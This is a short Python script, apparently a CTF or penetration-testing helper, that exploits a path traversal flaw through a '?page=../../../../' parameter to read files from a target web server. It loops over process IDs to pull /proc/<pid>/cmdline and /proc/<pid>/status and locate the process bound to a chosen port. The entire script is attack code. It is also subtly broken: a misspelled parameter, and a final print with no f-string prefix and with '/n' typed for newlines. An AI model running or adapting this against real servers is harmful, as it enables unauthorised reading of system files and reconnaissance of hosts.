import requests

def readfile(url,path) :
    file = f"{url}/?page=../../../../{path}"
    try :
        rep = requests.get(file)
        if rep.status_code == 200:
            return rep.text
        else :
            return None
    except Exception as e :
        print ("ulach ?")
        return None

def find_pid_port(usl,port) :
    for i in range(0,1000) :
        cmdline = f"proc/{i}/cmdline"
        cmd = readfile(url,cmdline)
        if cmd :
            if str(port) in cmd :
                return i

    return None


url = "http://baseurl0"
port = '1337' #example
pid = find_pid_port(url,port)
if pid :
    cmdline = readfile(url,f"proc/{pid}/cmdline")
    status = readfile(url,f"proc/{pid}/status")
    print ("the port : pid : cmdline : status {port} /n {port} /n {cmdline} /n {status} ")

else :
    print ("tchiwawa")
